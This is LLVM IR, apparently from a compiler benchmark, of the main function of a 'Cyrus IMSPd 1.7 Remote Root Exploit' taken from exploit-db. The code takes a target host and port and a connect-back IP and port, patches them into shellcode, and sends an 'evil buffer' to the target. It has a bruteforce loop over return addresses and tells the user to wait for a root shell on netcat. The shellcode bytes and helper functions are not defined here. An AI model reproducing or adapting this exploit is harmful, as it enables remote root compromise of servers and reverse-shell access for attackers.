; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23441.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23441.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64, i32 }

@DEFAULT_PORT = common dso_local global i32 0, align 4
@DEFAULT_START_ADDRESS = common dso_local global i32 0, align 4
@Shellcode = common dso_local global i32* null, align 8
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [47 x i8] c"\0A==[ Cyrus IMSPd 1.7 Remote Root Exploit ]==\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"h:t:p:ba:r:i:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = external dso_local global i8*, align 8
@.str.2 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@BRUTEFORCE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [6 x i8] c"0x%lx\00", align 1
@Targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.4 = private unnamed_addr constant [32 x i8] c"*** Target plataform      : %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"*** Target host           : %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"*** Target port           : %u\0A\00", align 1
@.str.7 = private unnamed_addr constant [41 x i8] c"*** IP to connect back    : %u.%u.%u.%u\0A\00", align 1
@.str.8 = private unnamed_addr constant [32 x i8] c"*** Port to connect back  : %u\0A\00", align 1
@.str.9 = private unnamed_addr constant [37 x i8] c"*** Target RET            : %#010x\0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [37 x i8] c"*** Bruteforce mode start : %#010x\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [18 x i8] c"Could not connect\00", align 1
@.str.12 = private unnamed_addr constant [15 x i8] c"[+] Connected\0A\00", align 1
@.str.13 = private unnamed_addr constant [26 x i8] c"[+] Creating evil buffer\0A\00", align 1
@.str.14 = private unnamed_addr constant [25 x i8] c"[+] Sending evil buffer\0A\00", align 1
@.str.15 = private unnamed_addr constant [41 x i8] c"[+] Wait for root shell on your netcat\0A\0A\00", align 1
@.str.16 = private unnamed_addr constant [28 x i8] c"[+] Using RetAddr = %#010x\0A\00", align 1
@.str.17 = private unnamed_addr constant [28 x i8] c"[-] Error. Restarting ...\0A\0A\00", align 1
@.str.18 = private unnamed_addr constant [7 x i8] c"%#010x\00", align 1
@.str.19 = private unnamed_addr constant [3 x i8] c"-h\00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"-b\00", align 1
@.str.21 = private unnamed_addr constant [3 x i8] c"-a\00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"-i\00", align 1
@.str.23 = private unnamed_addr constant [3 x i8] c"-r\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca [20 x i8], align 16
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i16*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %7, align 8
  %25 = load i32, i32* @DEFAULT_PORT, align 4
  store i32 %25, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %26 = load i32, i32* @DEFAULT_START_ADDRESS, align 4
  store i32 %26, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  %27 = load i32*, i32** @Shellcode, align 8
  %28 = getelementptr inbounds i32, i32* %27, i64 39
  %29 = bitcast i32* %28 to i16*
  store i16* %29, i16** %24, align 8
  %30 = load i32, i32* @stdout, align 4
  %31 = call i32 (i32, i8*, ...) @fprintf(i32 %30, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str, i64 0, i64 0))
  br label %32

32:                                               ; preds = %117, %2
  %33 = load i32, i32* %4, align 4
  %34 = load i8**, i8*** %5, align 8
  %35 = call signext i8 @getopt(i32 %33, i8** %34, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  store i8 %35, i8* %6, align 1
  %36 = sext i8 %35 to i32
  %37 = load i8, i8* @EOF, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp ne i32 %36, %38
  br i1 %39, label %40, label %118

40:                                               ; preds = %32
  %41 = load i8, i8* %6, align 1
  %42 = sext i8 %41 to i32
  switch i32 %42, label %112 [
    i32 105, label %43
    i32 114, label %54
    i32 104, label %66
    i32 112, label %68
    i32 98, label %79
    i32 97, label %90
    i32 116, label %100
  ]

43:                                               ; preds = %40
  %44 = load i8*, i8** @optarg, align 8
  %45 = call i32 (i8*, i8*, i32*, ...) @sscanf(i8* %44, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i32* %21, i32* %20, i32* %19, i32* %18)
  %46 = icmp ne i32 %45, 4
  br i1 %46, label %47, label %52

47:                                               ; preds = %43
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @Usage(i8* %50)
  br label %52

52:                                               ; preds = %47, %43
  %53 = load i8*, i8** @optarg, align 8
  store i8* %53, i8** %22, align 8
  br label %117

54:                                               ; preds = %40
  %55 = load i8*, i8** @optarg, align 8
  %56 = call i32 @atoi(i8* %55)
  store i32 %56, i32* %16, align 4
  %57 = load i32, i32* %16, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %64, label %59

59:                                               ; preds = %54
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 0
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @Usage(i8* %62)
  br label %64

64:                                               ; preds = %59, %54
  %65 = load i8*, i8** @optarg, align 8
  store i8* %65, i8** %23, align 8
  br label %117

66:                                               ; preds = %40
  %67 = load i8*, i8** @optarg, align 8
  store i8* %67, i8** %7, align 8
  br label %117

68:                                               ; preds = %40
  %69 = load i8*, i8** @optarg, align 8
  %70 = call i32 @atoi(i8* %69)
  store i32 %70, i32* %8, align 4
  %71 = load i32, i32* %8, align 4
  %72 = icmp ne i32 %71, 0
  br i1 %72, label %78, label %73

73:                                               ; preds = %68
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 0
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @Usage(i8* %76)
  br label %78

78:                                               ; preds = %73, %68
  br label %117

79:                                               ; preds = %40
  %80 = load i32, i32* %9, align 4
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %82, label %84

82:                                               ; preds = %79
  %83 = load i32, i32* @BRUTEFORCE, align 4
  store i32 %83, i32* %9, align 4
  br label %89

84:                                               ; preds = %79
  %85 = load i8**, i8*** %5, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 0
  %87 = load i8*, i8** %86, align 8
  %88 = call i32 @Usage(i8* %87)
  br label %89

89:                                               ; preds = %84, %82
  br label %117

90:                                               ; preds = %40
  %91 = load i8*, i8** @optarg, align 8
  %92 = call i32 (i8*, i8*, i32*, ...) @sscanf(i8* %91, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i32* %10)
  %93 = icmp ne i32 %92, 1
  br i1 %93, label %94, label %99

94:                                               ; preds = %90
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @Usage(i8* %97)
  br label %99

99:                                               ; preds = %94, %90
  br label %117

100:                                              ; preds = %40
  %101 = load i8*, i8** @optarg, align 8
  %102 = call i32 @atoi(i8* %101)
  store i32 %102, i32* %11, align 4
  %103 = load i32, i32* %9, align 4
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %106

105:                                              ; preds = %100
  store i32 128, i32* %9, align 4
  br label %111

106:                                              ; preds = %100
  %107 = load i8**, i8*** %5, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 0
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @Usage(i8* %109)
  br label %111

111:                                              ; preds = %106, %105
  br label %117

112:                                              ; preds = %40
  %113 = load i8**, i8*** %5, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 0
  %115 = load i8*, i8** %114, align 8
  %116 = call i32 @Usage(i8* %115)
  br label %117

117:                                              ; preds = %112, %111, %99, %89, %78, %66, %64, %52
  br label %32

118:                                              ; preds = %32
  %119 = load i8*, i8** %7, align 8
  %120 = icmp eq i8* %119, null
  br i1 %120, label %124, label %121

121:                                              ; preds = %118
  %122 = load i32, i32* %9, align 4
  %123 = icmp eq i32 %122, 0
  br i1 %123, label %124, label %129

124:                                              ; preds = %121, %118
  %125 = load i8**, i8*** %5, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 0
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @Usage(i8* %127)
  br label %129

129:                                              ; preds = %124, %121
  %130 = load i32, i32* %16, align 4
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %137

132:                                              ; preds = %129
  %133 = load i8**, i8*** %5, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 0
  %135 = load i8*, i8** %134, align 8
  %136 = call i32 @Usage(i8* %135)
  br label %137

137:                                              ; preds = %132, %129
  %138 = load i32, i32* %18, align 4
  %139 = icmp eq i32 %138, 0
  br i1 %139, label %149, label %140

140:                                              ; preds = %137
  %141 = load i32, i32* %19, align 4
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %149, label %143

143:                                              ; preds = %140
  %144 = load i32, i32* %20, align 4
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %149, label %146

146:                                              ; preds = %143
  %147 = load i32, i32* %21, align 4
  %148 = icmp eq i32 %147, 0
  br i1 %148, label %149, label %154

149:                                              ; preds = %146, %143, %140, %137
  %150 = load i8**, i8*** %5, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 0
  %152 = load i8*, i8** %151, align 8
  %153 = call i32 @Usage(i8* %152)
  br label %154

154:                                              ; preds = %149, %146
  store i32 0, i32* %14, align 4
  br label %155

155:                                              ; preds = %165, %154
  %156 = load %struct.TYPE_2__*, %struct.TYPE_2__** @Targets, align 8
  %157 = load i32, i32* %14, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %156, i64 %158
  %160 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %159, i32 0, i32 0
  %161 = load i64, i64* %160, align 8
  %162 = icmp eq i64 %161, 0
  br i1 %162, label %163, label %164

163:                                              ; preds = %155
  br label %168

164:                                              ; preds = %155
  br label %165

165:                                              ; preds = %164
  %166 = load i32, i32* %14, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %14, align 4
  br label %155

168:                                              ; preds = %163
  %169 = load i32, i32* %14, align 4
  %170 = add nsw i32 %169, -1
  store i32 %170, i32* %14, align 4
  %171 = load i32, i32* %11, align 4
  %172 = icmp slt i32 %170, %171
  br i1 %172, label %173, label %178

173:                                              ; preds = %168
  %174 = load i8**, i8*** %5, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 0
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 @Usage(i8* %176)
  br label %178

178:                                              ; preds = %173, %168
  %179 = load i32, i32* %21, align 4
  %180 = load i32*, i32** @Shellcode, align 8
  %181 = getelementptr inbounds i32, i32* %180, i64 33
  store i32 %179, i32* %181, align 4
  %182 = load i32, i32* %20, align 4
  %183 = load i32*, i32** @Shellcode, align 8
  %184 = getelementptr inbounds i32, i32* %183, i64 34
  store i32 %182, i32* %184, align 4
  %185 = load i32, i32* %19, align 4
  %186 = load i32*, i32** @Shellcode, align 8
  %187 = getelementptr inbounds i32, i32* %186, i64 35
  store i32 %185, i32* %187, align 4
  %188 = load i32, i32* %18, align 4
  %189 = load i32*, i32** @Shellcode, align 8
  %190 = getelementptr inbounds i32, i32* %189, i64 36
  store i32 %188, i32* %190, align 4
  %191 = load i32, i32* %16, align 4
  %192 = trunc i32 %191 to i16
  %193 = call zeroext i16 @htons(i16 zeroext %192)
  %194 = load i16*, i16** %24, align 8
  store i16 %193, i16* %194, align 2
  %195 = load i32, i32* %9, align 4
  %196 = icmp eq i32 %195, 128
  br i1 %196, label %197, label %206

197:                                              ; preds = %178
  %198 = load i32, i32* @stdout, align 4
  %199 = load %struct.TYPE_2__*, %struct.TYPE_2__** @Targets, align 8
  %200 = load i32, i32* %11, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %199, i64 %201
  %203 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %202, i32 0, i32 0
  %204 = load i64, i64* %203, align 8
  %205 = call i32 (i32, i8*, ...) @fprintf(i32 %198, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0), i64 %204)
  br label %206

206:                                              ; preds = %197, %178
  %207 = load i32, i32* @stdout, align 4
  %208 = load i8*, i8** %7, align 8
  %209 = call i32 (i32, i8*, ...) @fprintf(i32 %207, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0), i8* %208)
  %210 = load i32, i32* @stdout, align 4
  %211 = load i32, i32* %8, align 4
  %212 = call i32 (i32, i8*, ...) @fprintf(i32 %210, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0), i32 %211)
  %213 = load i32, i32* @stdout, align 4
  %214 = load i32, i32* %21, align 4
  %215 = load i32, i32* %20, align 4
  %216 = load i32, i32* %19, align 4
  %217 = load i32, i32* %18, align 4
  %218 = call i32 (i32, i8*, ...) @fprintf(i32 %213, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0), i32 %214, i32 %215, i32 %216, i32 %217)
  %219 = load i32, i32* @stdout, align 4
  %220 = load i32, i32* %16, align 4
  %221 = call i32 (i32, i8*, ...) @fprintf(i32 %219, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.8, i64 0, i64 0), i32 %220)
  %222 = load i32, i32* %9, align 4
  %223 = icmp eq i32 %222, 128
  br i1 %223, label %224, label %233

224:                                              ; preds = %206
  %225 = load i32, i32* @stdout, align 4
  %226 = load %struct.TYPE_2__*, %struct.TYPE_2__** @Targets, align 8
  %227 = load i32, i32* %11, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %226, i64 %228
  %230 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %229, i32 0, i32 1
  %231 = load i32, i32* %230, align 8
  %232 = call i32 (i32, i8*, ...) @fprintf(i32 %225, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0), i32 %231)
  br label %237

233:                                              ; preds = %206
  %234 = load i32, i32* @stdout, align 4
  %235 = load i32, i32* %10, align 4
  %236 = call i32 (i32, i8*, ...) @fprintf(i32 %234, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.10, i64 0, i64 0), i32 %235)
  br label %237

237:                                              ; preds = %233, %224
  %238 = load i32, i32* %9, align 4
  switch i32 %238, label %270 [
    i32 128, label %239
  ]

239:                                              ; preds = %237
  %240 = load i8*, i8** %7, align 8
  %241 = load i32, i32* %8, align 4
  %242 = call i32 @ConectToHost(i8* %240, i32 %241)
  store i32 %242, i32* %12, align 4
  %243 = load i32, i32* %12, align 4
  %244 = icmp eq i32 %243, -1
  br i1 %244, label %245, label %247

245:                                              ; preds = %239
  %246 = call i32 @fatal(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.11, i64 0, i64 0))
  br label %250

247:                                              ; preds = %239
  %248 = load i32, i32* @stdout, align 4
  %249 = call i32 (i32, i8*, ...) @fprintf(i32 %248, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0))
  br label %250

250:                                              ; preds = %247, %245
  %251 = load i32, i32* @stdout, align 4
  %252 = call i32 (i32, i8*, ...) @fprintf(i32 %251, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.13, i64 0, i64 0))
  %253 = load %struct.TYPE_2__*, %struct.TYPE_2__** @Targets, align 8
  %254 = load i32, i32* %11, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %253, i64 %255
  %257 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %256, i32 0, i32 1
  %258 = load i32, i32* %257, align 8
  %259 = call i8* @CreateEvilBuffer(i32 %258)
  store i8* %259, i8** %15, align 8
  %260 = load i32, i32* @stdout, align 4
  %261 = call i32 (i32, i8*, ...) @fprintf(i32 %260, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.14, i64 0, i64 0))
  %262 = load i32, i32* %12, align 4
  %263 = load i8*, i8** %15, align 8
  %264 = load i8*, i8** %15, align 8
  %265 = call i32 @strlen(i8* %264)
  %266 = call i32 @send(i32 %262, i8* %263, i32 %265, i32 0)
  %267 = call i32 @sleep(i32 1)
  %268 = load i32, i32* @stdout, align 4
  %269 = call i32 (i32, i8*, ...) @fprintf(i32 %268, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.15, i64 0, i64 0))
  br label %322

270:                                              ; preds = %237
  br label %271

271:                                              ; preds = %321, %270
  %272 = load i32, i32* @stdout, align 4
  %273 = load i32, i32* %10, align 4
  %274 = call i32 (i32, i8*, ...) @fprintf(i32 %272, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.16, i64 0, i64 0), i32 %273)
  %275 = load i8*, i8** %7, align 8
  %276 = load i32, i32* %8, align 4
  %277 = call i32 @ConectToHost(i8* %275, i32 %276)
  store i32 %277, i32* %12, align 4
  %278 = load i32, i32* %12, align 4
  %279 = icmp eq i32 %278, -1
  br i1 %279, label %280, label %298

280:                                              ; preds = %271
  %281 = load i32, i32* @stdout, align 4
  %282 = call i32 (i32, i8*, ...) @fprintf(i32 %281, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.17, i64 0, i64 0))
  %283 = call i32 @sleep(i32 1)
  %284 = getelementptr inbounds [20 x i8], [20 x i8]* %17, i64 0, i64 0
  %285 = load i32, i32* %10, align 4
  %286 = call i32 @sprintf(i8* %284, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.18, i64 0, i64 0), i32 %285)
  %287 = load i8**, i8*** %5, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 0
  %289 = load i8*, i8** %288, align 8
  %290 = load i8**, i8*** %5, align 8
  %291 = getelementptr inbounds i8*, i8** %290, i64 0
  %292 = load i8*, i8** %291, align 8
  %293 = load i8*, i8** %7, align 8
  %294 = getelementptr inbounds [20 x i8], [20 x i8]* %17, i64 0, i64 0
  %295 = load i8*, i8** %22, align 8
  %296 = load i8*, i8** %23, align 8
  %297 = call i32 @execl(i8* %289, i8* %292, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0), i8* %293, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.21, i64 0, i64 0), i8* %294, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.22, i64 0, i64 0), i8* %295, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.23, i64 0, i64 0), i8* %296, i32 0)
  br label %321

298:                                              ; preds = %271
  %299 = load i32, i32* @stdout, align 4
  %300 = call i32 (i32, i8*, ...) @fprintf(i32 %299, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0))
  %301 = load i32, i32* @stdout, align 4
  %302 = call i32 (i32, i8*, ...) @fprintf(i32 %301, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.13, i64 0, i64 0))
  %303 = load i32, i32* %10, align 4
  %304 = call i8* @CreateEvilBuffer(i32 %303)
  store i8* %304, i8** %15, align 8
  %305 = load i32, i32* @stdout, align 4
  %306 = call i32 (i32, i8*, ...) @fprintf(i32 %305, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.14, i64 0, i64 0))
  %307 = load i32, i32* %12, align 4
  %308 = load i8*, i8** %15, align 8
  %309 = load i8*, i8** %15, align 8
  %310 = call i32 @strlen(i8* %309)
  %311 = call i32 @send(i32 %307, i8* %308, i32 %310, i32 0)
  %312 = call i32 @sleep(i32 1)
  %313 = load i32, i32* %12, align 4
  %314 = call i32 @close(i32 %313)
  %315 = load i8*, i8** %15, align 8
  %316 = call i32 @free(i8* %315)
  %317 = load i32, i32* @stdout, align 4
  %318 = call i32 (i32, i8*, ...) @fprintf(i32 %317, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i64 0, i64 0))
  %319 = load i32, i32* %10, align 4
  %320 = call i32 @GetNextAddr(i32 %319)
  store i32 %320, i32* %10, align 4
  br label %321

321:                                              ; preds = %298, %280
  br label %271

322:                                              ; preds = %250
  %323 = load i8*, i8** %15, align 8
  %324 = call i32 @free(i8* %323)
  %325 = load i32, i32* %12, align 4
  %326 = call i32 @close(i32 %325)
  %327 = load i32, i32* %3, align 4
  ret i32 %327
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*, ...) #1

declare dso_local i32 @Usage(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local zeroext i16 @htons(i16 zeroext) #1

declare dso_local i32 @ConectToHost(i8*, i32) #1

declare dso_local i32 @fatal(i8*) #1

declare dso_local i8* @CreateEvilBuffer(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @GetNextAddr(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
